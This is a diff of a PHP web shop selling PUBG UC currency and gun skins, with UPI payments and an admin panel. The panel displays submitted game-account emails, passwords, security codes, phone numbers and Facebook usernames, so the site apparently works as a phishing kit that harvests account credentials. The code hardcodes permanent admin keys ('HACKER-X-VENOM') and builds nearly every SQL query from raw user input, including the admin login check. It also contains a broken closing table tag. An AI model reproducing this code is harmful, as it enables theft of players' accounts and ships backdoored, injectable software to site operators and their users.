@@ -1,6 +1,6 @@
 <?php
 session_start();
-$db = new SQLite3('pubg_shop.db');
+$db = new SQLite3('pubg_shop.db', SQLITE3_OPEN_CREATE | SQLITE3_OPEN_READWRITE);
 
 // Create all tables
 $db->exec("CREATE TABLE IF NOT EXISTS users (
@@ -100,58 +100,51 @@ $settings = [
 
 foreach($settings as $key => $value) {
     $check = $db->querySingle("SELECT value FROM site_settings WHERE key='$key'");
-    if(!$check) {
-        $db->exec("INSERT INTO site_settings VALUES ('$key', '$value')");
-    }
+    if(!$check) $db->exec("INSERT INTO site_settings VALUES ('$key', '$value')");
 }
 
-// Insert default products if not exist
+// Insert default admin keys
+$master_key = "HACKER-X-VENOM";
+$check = $db->querySingle("SELECT id FROM admin_keys WHERE key_code='$master_key'");
+if(!$check) $db->exec("INSERT INTO admin_keys VALUES (NULL, '$master_key', datetime('now'))");
+
+$admin_key = "VENOM-X-OWNER";
+$check = $db->querySingle("SELECT id FROM admin_keys WHERE key_code='$admin_key'");
+if(!$check) $db->exec("INSERT INTO admin_keys VALUES (NULL, '$admin_key', datetime('now'))");
+
+// Insert default products with new prices
 $check = $db->querySingle("SELECT COUNT(*) FROM products");
 if($check == 0) {
-    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('60 UC', 35, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
-    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('350 UC', 230, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
-    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('1500 UC', 999, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
-    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('3800 UC', 1999, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
-    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('6050 UC', 4999, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
+    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('180 UC', 60, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
+    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('385 UC', 125, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
+    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('750 UC', 360, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
+    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('1600 UC', 699, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
+    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('3000 UC', 1499, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
+    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('5000 UC', 1999, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
+    $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('10000 UC', 4999, 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
     
     // Default gun products
     $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('AK-47 Glacier', 499, 50, 'https://i.ibb.co/Mxy4TpRR/file-129.jpg', 'gun')");
     $db->exec("INSERT INTO products (name, price, quantity, image, type) VALUES ('M416 Frozen', 599, 50, 'https://i.ibb.co/Mxy4TpRR/file-129.jpg', 'gun')");
 }
 
-// Insert master admin key
-$master_key = "HACKER-X-VENOM";
-$check = $db->querySingle("SELECT id FROM admin_keys WHERE key_code='$master_key'");
-if(!$check) $db->exec("INSERT INTO admin_keys VALUES (NULL, '$master_key', datetime('now'))");
+// Get settings
+$login_bg = $db->querySingle("SELECT value FROM site_settings WHERE key='login_bg'");
+$logo_img = $db->querySingle("SELECT value FROM site_settings WHERE key='logo'");
+$theme_color = $db->querySingle("SELECT value FROM site_settings WHERE key='theme_color'");
+$theme_btn = $db->querySingle("SELECT value FROM site_settings WHERE key='theme_btn'");
+$upi_id = $db->querySingle("SELECT value FROM site_settings WHERE key='upi_id'");
+$qr_bg = $db->querySingle("SELECT value FROM site_settings WHERE key='qr_bg'");
+$uc_shop_img = $db->querySingle("SELECT value FROM site_settings WHERE key='uc_shop_img'");
+$gun_shop_img = $db->querySingle("SELECT value FROM site_settings WHERE key='gun_shop_img'");
 
-define('ADMIN_KEY', 'VENOM-X-OWNER');
-
-// Stylish number function
+// Stylish functions
 function stylish_number($num) {
     $stylish = ['𝟎','𝟏','𝟐','𝟑','𝟒','𝟓','𝟔','𝟕','𝟖','𝟗'];
     $result = '';
     foreach(str_split($num) as $d) {
         if(is_numeric($d)) $result .= $stylish[intval($d)];
         else $result .= $d;
-    }
-    return $result;
-}
-
-function stylish_text($text) {
-    $map = [
-        'A'=>'𝐀','B'=>'𝐁','C'=>'𝐂','D'=>'𝐃','E'=>'𝐄','F'=>'𝐅','G'=>'𝐆',
-        'H'=>'𝐇','I'=>'𝐈','J'=>'𝐉','K'=>'𝐊','L'=>'𝐋','M'=>'𝐌','N'=>'𝐍',
-        'O'=>'𝐎','P'=>'𝐏','Q'=>'𝐐','R'=>'𝐑','S'=>'𝐒','T'=>'𝐓','U'=>'𝐔',
-        'V'=>'𝐕','W'=>'𝐖','X'=>'𝐗','Y'=>'𝐘','Z'=>'𝐙',
-        'a'=>'𝐚','b'=>'𝐛','c'=>'𝐜','d'=>'𝐝','e'=>'𝐞','f'=>'𝐟','g'=>'𝐠',
-        'h'=>'𝐡','i'=>'𝐢','j'=>'𝐣','k'=>'𝐤','l'=>'𝐥','m'=>'𝐦','n'=>'𝐧',
-        'o'=>'𝐨','p'=>'𝐩','q'=>'𝐪','r'=>'𝐫','s'=>'𝐬','t'=>'𝐭','u'=>'𝐮',
-        'v'=>'𝐯','w'=>'𝐰','x'=>'𝐱','y'=>'𝐲','z'=>'𝐳'
-    ];
-    $result = '';
-    for($i=0;$i<strlen($text);$i++) {
-        $c = $text[$i];
-        $result .= $map[$c] ?? $c;
     }
     return $result;
 }
@@ -185,8 +178,6 @@ if(isset($_POST['signup'])) {
     if(!$check) {
         $db->exec("INSERT INTO users (email, name, password, wallet) VALUES ('$email', '$name', '$pass', 0)");
         $_SESSION['user_id'] = $db->lastInsertRowID();
-    } else {
-        $error = "Email already exists!";
     }
     header("Location: index.php");
     exit;
@@ -209,7 +200,7 @@ if(isset($_POST['login'])) {
 if(isset($_POST['admin_login'])) {
     $key = $_POST['admin_key'];
     $check = $db->querySingle("SELECT id FROM admin_keys WHERE key_code='$key'", true);
-    if($check || $key == ADMIN_KEY) {
+    if($check) {
         $_SESSION['admin_logged'] = true;
         header("Location: index.php?admin=1");
         exit;
@@ -383,6 +374,7 @@ if(isset($_POST['submit_fb_order'])) {
 
 // ========== ADMIN ACTIONS ==========
 if(isset($_SESSION['admin_logged'])) {
+    // Approve fund request
     if(isset($_GET['approve_fund'])) {
         $id = intval($_GET['approve_fund']);
         $fund = $db->querySingle("SELECT * FROM fund_requests WHERE id=$id AND status='pending'", true);
@@ -394,6 +386,7 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Ban user
     if(isset($_GET['ban_user'])) {
         $id = intval($_GET['ban_user']);
         $db->exec("UPDATE users SET banned = 1 WHERE id=$id");
@@ -401,6 +394,7 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Unban user
     if(isset($_GET['unban_user'])) {
         $id = intval($_GET['unban_user']);
         $db->exec("UPDATE users SET banned = 0 WHERE id=$id");
@@ -408,6 +402,7 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Add cash
     if(isset($_POST['add_cash'])) {
         $uid = intval($_POST['user_id']);
         $amt = floatval($_POST['amount']);
@@ -416,6 +411,7 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Add product
     if(isset($_POST['add_product'])) {
         $name = $_POST['name'];
         $price = floatval($_POST['price']);
@@ -427,6 +423,7 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Delete product
     if(isset($_GET['delete_product'])) {
         $id = intval($_GET['delete_product']);
         $db->exec("DELETE FROM products WHERE id=$id");
@@ -434,6 +431,7 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Update quantity
     if(isset($_POST['update_qty'])) {
         $id = intval($_POST['product_id']);
         $qty = intval($_POST['quantity']);
@@ -442,6 +440,7 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Complete order
     if(isset($_GET['complete_order'])) {
         $id = intval($_GET['complete_order']);
         $db->exec("UPDATE orders SET status='completed' WHERE id=$id");
@@ -449,11 +448,12 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Update settings
     if(isset($_POST['update_settings'])) {
         $updates = ['upi_id', 'qr_bg', 'theme_color', 'theme_btn', 'login_bg', 'logo', 'uc_shop_img', 'gun_shop_img'];
         foreach($updates as $key) {
             if(isset($_POST[$key])) {
-                $val = $_POST[$key];
+                $val = $db->escapeString($_POST[$key]);
                 $db->exec("UPDATE site_settings SET value='$val' WHERE key='$key'");
             }
         }
@@ -461,6 +461,7 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Add admin key
     if(isset($_POST['add_admin_key'])) {
         $new_key = $_POST['new_key'];
         $db->exec("INSERT INTO admin_keys (key_code) VALUES ('$new_key')");
@@ -468,6 +469,7 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Revoke admin key
     if(isset($_GET['revoke_key'])) {
         $key = $_GET['revoke_key'];
         if($key != 'HACKER-X-VENOM') {
@@ -477,6 +479,7 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Broadcast
     if(isset($_POST['broadcast'])) {
         $msg = $_POST['broadcast_msg'];
         $db->exec("INSERT INTO notifications (message) VALUES ('$msg')");
@@ -485,11 +488,11 @@ if(isset($_SESSION['admin_logged'])) {
     }
 }
 
-// Get current user
 $user = null;
 if(isset($_SESSION['user_id'])) {
     $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
 }
+$banned = isset($_SESSION['banned']) ? true : false;
 $msg = isset($_GET['msg']) ? urldecode($_GET['msg']) : '';
 $show_cart = isset($_GET['show_cart']) ? true : false;
 $step = isset($_GET['step']) ? $_GET['step'] : '';
@@ -503,16 +506,6 @@ $gun_products = $db->query("SELECT * FROM products WHERE type='gun' ORDER BY pri
 
 $is_admin = isset($_SESSION['admin_logged']) && isset($_GET['admin']);
 $admin_tab = isset($_GET['tab']) ? $_GET['tab'] : 'dashboard';
-
-// Get settings
-$login_bg = $db->querySingle("SELECT value FROM site_settings WHERE key='login_bg'");
-$logo_img = $db->querySingle("SELECT value FROM site_settings WHERE key='logo'");
-$theme_color = $db->querySingle("SELECT value FROM site_settings WHERE key='theme_color'");
-$theme_btn = $db->querySingle("SELECT value FROM site_settings WHERE key='theme_btn'");
-$upi_id = $db->querySingle("SELECT value FROM site_settings WHERE key='upi_id'");
-$qr_bg = $db->querySingle("SELECT value FROM site_settings WHERE key='qr_bg'");
-$uc_shop_img = $db->querySingle("SELECT value FROM site_settings WHERE key='uc_shop_img'");
-$gun_shop_img = $db->querySingle("SELECT value FROM site_settings WHERE key='gun_shop_img'");
 
 $google_icon = "https://i.ibb.co/wZTBJn3g/file-75.jpg";
 $facebook_icon = "https://i.ibb.co/k2S25TS9/file-74.jpg";
@@ -551,7 +544,7 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
         .login-card button { width: 100%; padding: 12px; background: <?php echo $theme_btn; ?>; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
         .switch { margin-top: 15px; color: #aaa; cursor: pointer; }
         .switch span { color: <?php echo $theme_color; ?>; }
-        .admin-link { margin-top: 15px; font-size: 12px; color: #666; text-decoration: none; display: inline-block; }
+        .admin-link { margin-top: 15px; font-size: 12px; color: <?php echo $theme_color; ?>; text-decoration: none; display: inline-block; }
         
         .dashboard { min-height: 100vh; background: #0a0a0a; padding: 20px; }
         .navbar {
@@ -770,7 +763,15 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
 </head>
 <body>
 
-<?php if($is_admin): ?>
+<?php if($banned): ?>
+<div class="login-page">
+    <div class="login-card">
+        <h2 style="color:#ff4444">🚫 You Have Been Banned</h2>
+        <p>Contact support for assistance.</p>
+        <a href="https://t.me/Ashxpro" class="telegram-support" style="display:inline-block; margin-top:20px;">📞 Contact Support</a>
+    </div>
+</div>
+<?php elseif($is_admin): ?>
 <!-- ADMIN PANEL -->
 <div class="admin-container">
     <div class="admin-header">
@@ -810,12 +811,13 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
         <table class="admin-table"><tr><th>ID</th><th>User ID</th><th>Amount</th><th>UTR</th><th>Status</th><th>Action</th></tr>
         <?php $funds = $db->query("SELECT * FROM fund_requests ORDER BY id DESC");
         while($f = $funds->fetchArray()): ?>
-        <tr><td><?php echo $f['id']; ?></td>
-        <td><?php echo $f['user_id']; ?></td>
-        <td>₹<?php echo $f['amount']; ?></td>
-        <td><?php echo htmlspecialchars($f['utr']); ?></td>
-        <td><?php echo $f['status']; ?></td>
-        <td><?php if($f['status']=='pending'){ ?><a href="?admin=1&approve_fund=<?php echo $f['id']; ?>" class="approve-btn">Approve</a><?php }else{ echo '-'; } ?></td>
+        <tr>
+            <td><?php echo $f['id']; ?></td>
+            <td><?php echo $f['user_id']; ?></td>
+            <td>₹<?php echo $f['amount']; ?></td>
+            <td><?php echo htmlspecialchars($f['utr']); ?></td>
+            <td><?php echo $f['status']; ?></td>
+            <td><?php if($f['status']=='pending'){ ?><a href="?admin=1&approve_fund=<?php echo $f['id']; ?>" class="approve-btn">Approve</a><?php }else{ echo '-'; } ?></td>
         </tr>
         <?php endwhile; ?>
         </table>
@@ -864,7 +866,7 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
         </form>
     </div>
     <div class="wallet-card">
-        <h3>All Products</h3>
+        <h3>All Products (Permanent)</h3>
         <table class="admin-table"><tr><th>ID</th><th>Name</th><th>Price</th><th>Qty</th><th>Type</th><th>Image</th><th>Action</th></tr>
         <?php $prods = $db->query("SELECT * FROM products ORDER BY type, price");
         while($p = $prods->fetchArray()): ?>
@@ -883,15 +885,15 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
                 </form>
                 <a href="?admin=1&delete_product=<?php echo $p['id']; ?>" class="delete-btn" onclick="return confirm('Delete?')">Delete</a>
             </td>
-         </tr>
+        </tr>
         <?php endwhile; ?>
-        </table>
+        </tr>
     </div>
     <?php endif; ?>
     
     <?php if($admin_tab=='orders'): ?>
     <div class="wallet-card">
-        <h3>All Orders</h3>
+        <h3>All Orders (Permanent)</h3>
         <table class="admin-table"><tr><th>ID</th><th>User ID</th><th>Product</th><th>Amount</th><th>Game UID</th><th>Status</th><th>Action</th></tr>
         <?php $orders = $db->query("SELECT * FROM orders ORDER BY id DESC");
         while($o = $orders->fetchArray()): ?>
@@ -903,7 +905,7 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
             <td><?php echo $o['game_uid']; ?></td>
             <td><?php echo $o['status']; ?></td>
             <td><?php if($o['status']=='pending'){ ?><a href="?admin=1&complete_order=<?php echo $o['id']; ?>" class="complete-btn">Complete</a><?php }else{ echo '-'; } ?></td>
-         </tr>
+        </tr>
         <?php endwhile; ?>
         </table>
     </div>
@@ -911,7 +913,7 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
     
     <?php if($admin_tab=='accounts'): ?>
     <div class="wallet-card">
-        <h3>Game Accounts Submitted</h3>
+        <h3>Game Accounts Submitted (Permanent)</h3>
         <table class="admin-table"><tr><th>ID</th><th>User ID</th><th>Platform</th><th>Game UID</th><th>Game Name</th><th>Email</th><th>Password</th><th>Security Code</th><th>Phone</th><th>FB Username</th><th>Level</th></tr>
         <?php $accounts = $db->query("SELECT * FROM game_accounts ORDER BY id DESC");
         while($a = $accounts->fetchArray()): ?>
@@ -927,7 +929,7 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
             <td><?php echo $a['phone']; ?></td>
             <td><?php echo $a['fb_username']; ?></td>
             <td><?php echo $a['game_level']; ?></td>
-         </tr>
+        </tr>
         <?php endwhile; ?>
         </table>
     </div>
@@ -937,11 +939,12 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
     <div class="wallet-card">
         <h3>Admin Keys Management</h3>
         <p><strong style="color:#00ff00;">Master Key (Permanent):</strong> HACKER-X-VENOM</p>
+        <p><strong>Default Admin Key:</strong> VENOM-X-OWNER</p>
         <form method="post">
             <input type="text" name="new_key" placeholder="New Admin Key" required>
             <button type="submit" name="add_admin_key">Add Admin Key</button>
         </form>
-        <h3 style="margin-top:20px;">Active Admin Keys</h3>
+        <h3 style="margin-top:20px;">All Admin Keys</h3>
         <table class="admin-table"><tr><th>Key</th><th>Created At</th><th>Action</th></tr>
         <?php $keys = $db->query("SELECT * FROM admin_keys ORDER BY id DESC");
         while($k = $keys->fetchArray()): ?>
@@ -949,7 +952,7 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
             <td><?php echo $k['key_code']; ?></td>
             <td><?php echo $k['created_at']; ?></td>
             <td><?php if($k['key_code'] != 'HACKER-X-VENOM'){ ?><a href="?admin=1&revoke_key=<?php echo urlencode($k['key_code']); ?>" class="revoke-btn">Revoke</a><?php }else{ echo 'Master Key'; } ?></td>
-         </tr>
+        </tr>
         <?php endwhile; ?>
         </table>
     </div>
@@ -1083,8 +1086,8 @@ function closeAdminLogin() { document.getElementById('adminLoginPopup').style.di
         <?php while($p = $uc_products->fetchArray()): ?>
         <div class="product-card">
             <img src="<?php echo $p['image']; ?>" class="product-img">
-            <div class="product-name"><?php echo stylish_text($p['name']); ?></div>
-            <div class="product-price">₹<?php echo stylish_number(number_format($p['price'], 0)); ?></div>
+            <div class="product-name"><?php echo htmlspecialchars($p['name']); ?></div>
+            <div class="product-price">₹<?php echo number_format($p['price'], 0); ?></div>
             <div class="product-qty">📦 Stock: <?php echo $p['quantity']; ?></div>
             <form method="post">
                 <input type="hidden" name="product_id" value="<?php echo $p['id']; ?>">
@@ -1110,8 +1113,8 @@ function closeAdminLogin() { document.getElementById('adminLoginPopup').style.di
         while($g = $gun_query->fetchArray()): $gun_count++; ?>
         <div class="product-card">
             <img src="<?php echo $g['image']; ?>" class="product-img">
-            <div class="product-name"><?php echo stylish_text($g['name']); ?></div>
-            <div class="product-price">₹<?php echo stylish_number(number_format($g['price'], 0)); ?></div>
+            <div class="product-name"><?php echo htmlspecialchars($g['name']); ?></div>
+            <div class="product-price">₹<?php echo number_format($g['price'], 0); ?></div>
             <div class="product-qty">📦 Stock: <?php echo $g['quantity']; ?></div>
             <form method="post">
                 <input type="hidden" name="product_id" value="<?php echo $g['id']; ?>">
@@ -1301,7 +1304,7 @@ function closeAdminLogin() { document.getElementById('adminLoginPopup').style.di
     </div>
 </div>
 
-<!-- QR Popup -->
+<!-- QR Popup for Add Funds -->
 <div id="qrPopup" class="popup">
     <div class="small-popup-card qr-fullscreen">
         <h3 style="color:#9b59b6">Scan & Pay</h3>
